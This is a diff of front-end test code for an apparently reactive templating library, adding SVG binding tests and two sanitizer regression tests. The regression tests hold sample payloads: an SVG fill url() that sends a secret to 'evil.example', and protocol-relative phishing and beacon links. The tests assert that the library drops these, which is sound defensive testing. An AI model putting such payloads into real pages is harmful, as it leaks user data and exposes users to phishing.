@@ -319,6 +319,59 @@ describe("substrate / charts (data-sh-chart)", () => {
   });
 });
 
+describe("substrate / data-sh-* on hand-drawn SVG", () => {
+  const SVGNS = "http://www.w3.org/2000/svg";
+
+  it("binds an SVG geometry attribute reactively", () => {
+    const el = root(`
+      <svg><rect data-sh-attr-height="h" width="10"></rect></svg>
+      <span id="grow" data-sh-on="click: set($, 'h', 20)"></span>`);
+    mountApp(el, { h: 5 });
+    const rect = el.querySelector("rect")!;
+    expect(rect.namespaceURI).toBe(SVGNS); // really an SVG element, not an HTML look-alike
+    expect(rect.getAttribute("height")).toBe("5");
+    click(el.querySelector("#grow"));
+    expect(rect.getAttribute("height")).toBe("20"); // reactive geometry
+  });
+
+  it("repeats SVG shapes per item (namespace preserved through the clone) with data-sh-index", () => {
+    const el = root(`
+      <svg viewBox="0 0 100 40">
+        <g data-sh-repeat="bars" data-sh-as="b" data-sh-index="i">
+          <rect width="18" data-sh-attr-x="i * 24" data-sh-attr-height="b.v"></rect>
+        </g>
+      </svg>`);
+    mountApp(el, { bars: [{ v: 10 }, { v: 20 }, { v: 30 }] });
+    const rects = el.querySelectorAll("rect");
+    expect(rects.length).toBe(3);
+    expect(Array.from(rects).every((r) => r.namespaceURI === SVGNS)).toBe(true); // SVG, not HTML
+    expect(Array.from(rects).map((r) => r.getAttribute("x"))).toEqual(["0", "24", "48"]); // data-sh-index
+    expect(Array.from(rects).map((r) => r.getAttribute("height"))).toEqual(["10", "20", "30"]);
+  });
+
+  it("an SVG shape is interactive via data-sh-on, and updates reactively", () => {
+    const el = root(`
+      <svg>
+        <circle r="5" data-sh-attr-fill="if(picked == 'a', '#00f', '#ccc')" data-sh-on="click: set($, 'picked', 'a')"></circle>
+      </svg>
+      <p data-sh-text="picked"></p>`);
+    mountApp(el, { picked: "" });
+    const circle = el.querySelector("circle")!;
+    expect(circle.getAttribute("fill")).toBe("#ccc");
+    click(circle); // click the SVG shape
+    expect(el.querySelector("p")!.textContent).toBe("a");
+    expect(circle.getAttribute("fill")).toBe("#00f"); // reactive fill flipped
+  });
+
+  it("binds text into an SVG <text> node", () => {
+    const el = root(`<svg><text data-sh-text="'$' + total"></text></svg>`);
+    mountApp(el, { total: 42 });
+    const t = el.querySelector("text")!;
+    expect(t.namespaceURI).toBe(SVGNS);
+    expect(t.textContent).toBe("$42");
+  });
+});
+
 describe("substrate / safety carries from markup into behavior", () => {
   it("rejects an unknown action at wire time", () => {
     const el = root(`<button data-sh-on="click: drop(habits)"></button>`);
@@ -425,5 +478,31 @@ describe("substrate / sweep regressions", () => {
     click(el.querySelector("#b")); // 2nd action throws (target 5 is not an object); bump() runs in finally
     expect(app.state().a).toBe(1);
     expect(el.querySelector("p")!.textContent).toBe("1"); // DOM re-synced to committed state
+  });
+
+  it("[medium] a reactive SVG paint drops an external url() funciri but keeps a local gradient ref", () => {
+    // a paint accepts url(<iri>); an EXTERNAL one fires an off-page GET (a no-script beacon) and must
+    // not survive the reactive door, exactly as the static sanitizer drops it.
+    const el = root(`<svg><rect width="9" height="9" data-sh-attr-fill="'url(https://evil.example/?leak=' + secret + ')'"></rect></svg>`);
+    mountApp(el, { secret: "abc" });
+    expect(el.querySelector("rect")!.hasAttribute("fill")).toBe(false); // external url() -> not set
+
+    const ok = root(`<svg><rect width="9" height="9" data-sh-attr-fill="grad"></rect></svg>`);
+    mountApp(ok, { grad: "url(#g)" });
+    expect(ok.querySelector("rect")!.getAttribute("fill")).toBe("url(#g)"); // local gradient ref still binds
+  });
+
+  it("[low] a reactive href/src drops a protocol-relative //host URL", () => {
+    const a = root(`<a data-sh-attr-href="'//evil.example/phish'">x</a>`);
+    mountApp(a, {});
+    expect(a.querySelector("a")!.hasAttribute("href")).toBe(false); // //host -> third-party origin, dropped
+
+    const img = root(`<img data-sh-attr-src="'//evil.example/beacon.png'">`);
+    mountApp(img, {});
+    expect(img.querySelector("img")!.hasAttribute("src")).toBe(false);
+
+    const ok = root(`<a data-sh-attr-href="'/local/path'">x</a>`); // a real relative path still binds
+    mountApp(ok, {});
+    expect(ok.querySelector("a")!.getAttribute("href")).toBe("/local/path");
   });
 });
